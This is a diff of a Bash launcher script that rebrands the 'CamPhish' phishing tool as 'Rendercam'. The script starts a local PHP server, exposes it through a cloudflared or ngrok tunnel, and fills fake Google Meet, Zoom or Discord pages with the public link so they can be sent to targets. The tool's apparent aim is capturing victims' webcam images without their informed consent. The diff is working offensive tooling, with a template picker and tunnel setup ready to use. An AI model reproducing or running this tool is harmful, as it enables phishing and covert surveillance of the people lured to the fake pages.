@@ -1,6 +1,8 @@
 #!/bin/bash
-# CamPhish v2.0
-# Powered by TechChip
+
+# Rendercam v1.0.0
+
+__version__="1.0.0"
 
 # Windows compatibility check
 if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
@@ -10,16 +12,16 @@ if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(
   
   # Define Windows-specific command replacements
   function killall() {
-    taskkill /F /IM "\$1" 2>/dev/null
+    taskkill /F /IM "$1" 2>/dev/null
   }
   
   function pkill() {
-    if [[ "\$1" == "-f" ]]; then
+    if [[ "$1" == "-f" ]]; then
       shift
       shift
-      taskkill /F /FI "IMAGENAME eq \$1" 2>/dev/null
+      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
     else
-      taskkill /F /IM "\$1" 2>/dev/null
+      taskkill /F /IM "$1" 2>/dev/null
     fi
   }
 else
@@ -30,18 +32,14 @@ trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
-printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
-printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
-printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
-printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
-printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
-printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
-printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
-
+printf "\033[36m                     _           \e[0m\e[1;77m                     \e[0m\n"
+printf "\033[36m                    | |          \e[0m\e[1;77m                     \e[0m\n"
+printf "\033[36m  _ __ ___ _ __   __| | ___ _ __ \e[0m\e[1;77m  ___ __ _ _ __ ___  \e[0m\n"
+printf "\033[36m |  __/ _ \  _ \ / _  |/ _ \  __|\e[0m\e[1;77m / __/ _  |  _   _ \ \e[0m\n"
+printf "\033[36m | | |  __/ | | | (_| |  __/ |   \e[0m\e[1;77m| (_| (_| | | | | | |\e[0m\n"
+printf "\033[36m |_|  \___|_| |_|\__,_|\___|_|   \e[0m\e[1;77m \___\__,_|_| |_| |_|\e[0m\n"
+printf " \e[1;93m Tool created by Render             Version: ${__version__} \e[0m \n"
 printf "\n"
-
-
 }
 
 dependencies() {
@@ -260,19 +258,16 @@ fi
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
 rm -rf .cloudflared.log > /dev/null 2>&1 &
 
-# Add error redirection and logging for cloudflared
 if [[ "$windows_mode" == true ]]; then
-    ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log 2>&1 &
+    ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
 else
-    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log 2>&1 &
+    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
 fi
 
 sleep 10
-
 link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
@@ -282,9 +277,6 @@ printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, r
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1:3333\n"
-# Display the log file content for troubleshooting
-printf "\e[1;93m[!] Cloudflared Log:\e[0m\n"
-cat .cloudflared.log
 exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
@@ -295,8 +287,17 @@ checkfound
 
 payload_cloudflare() {
 link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
-# Use the selected meeting type and the number of pictures
-sed "s+forwarding_link+$link/template.php?meeting=$meeting_type&num_pictures=$num_pictures+g" template.php > index.php
+sed 's+forwarding_link+'$link'+g' template.php > index.php
+if [[ $option_tem -eq 1 ]]; then
+sed 's+forwarding_link+'$link'+g' googlemeet.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+elif [[ $option_tem -eq 2 ]]; then
+sed 's+forwarding_link+'$link'+g' zoom.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+else
+sed 's+forwarding_link+'$link'+g' discord.html > index2.html
+fi
+rm -rf index3.html
 }
 
 ngrok_server() {
@@ -304,7 +305,7 @@ if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
 echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 
 # Detect architecture
@@ -442,8 +443,17 @@ checkfound
 
 payload_ngrok() {
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
-# Use the selected meeting type and the number of pictures
-sed "s+forwarding_link+$link/template.php?meeting=$meeting_type&num_pictures=$num_pictures+g" template.php > index.php
+sed 's+forwarding_link+'$link'+g' template.php > index.php
+if [[ $option_tem -eq 1 ]]; then
+sed 's+forwarding_link+'$link'+g' googlemeet.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+elif [[ $option_tem -eq 2 ]]; then
+sed 's+forwarding_link+'$link'+g' zoom.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+else
+sed 's+forwarding_link+'$link'+g' discord.html > index2.html
+fi
+rm -rf index3.html
 }
 
 rendercam() {
@@ -457,8 +467,7 @@ printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
-select_meeting_type
-ask_num_pictures
+select_template
 
 if [[ $option_server -eq 2 ]]; then
 cloudflare_tunnel
@@ -472,44 +481,36 @@ rendercam
 fi
 }
 
-select_meeting_type() {
-  printf "\n-----Choose a Meeting Type----\n"
-  printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Google Meet\e[0m\n"
-  printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Zoom\e[0m\n"
-  printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Discord\e[0m\n"
-  default_meeting_type="1"
-  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a meeting type: [Default is 1] \e[0m' meeting_type_option
-  meeting_type_option="${meeting_type_option:-${default_meeting_type}}"
-
-  case $meeting_type_option in
-    1)
-      meeting_type="googlemeet"
-      ;;
-    2)
-      meeting_type="zoom"
-      ;;
-    3)
-      meeting_type="discord"
-      ;;
-    *)
-      printf "\e[1;93m [!] Invalid meeting type option! Defaulting to Google Meet.\e[0m\n"
-      meeting_type="googlemeet"
-      ;;
-  esac
-}
-
-ask_num_pictures() {
-  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] How many pictures to take before redirecting? [Default is 1] \e[0m' num_pictures
-  num_pictures="${num_pictures:-1}"
-  
-  # Validate input
-  if ! [[ "$num_pictures" =~ ^[0-9]+$ ]]; then
-    printf "\e[1;93m [!] Invalid number of pictures! Defaulting to 1.\e[0m\n"
-    num_pictures="1"
-  fi
+select_template() {
+if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
+printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
+sleep 1
+clear
+banner
+rendercam
+else
+printf "\n-----Choose a template----\n"    
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Google Meet\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Zoom\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Discord\e[0m\n"
+default_option_template="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
+option_tem="${option_tem:-${default_option_template}}"
+if [[ $option_tem -eq 1 ]]; then
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
+fest_name="${fest_name//[[:space:]]/}"
+elif [[ $option_tem -eq 2 ]]; then
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
+elif [[ $option_tem -eq 3 ]]; then
+printf ""
+else
+printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
+sleep 1
+select_template
+fi
+fi
 }
 
 banner
 dependencies
 rendercam
-
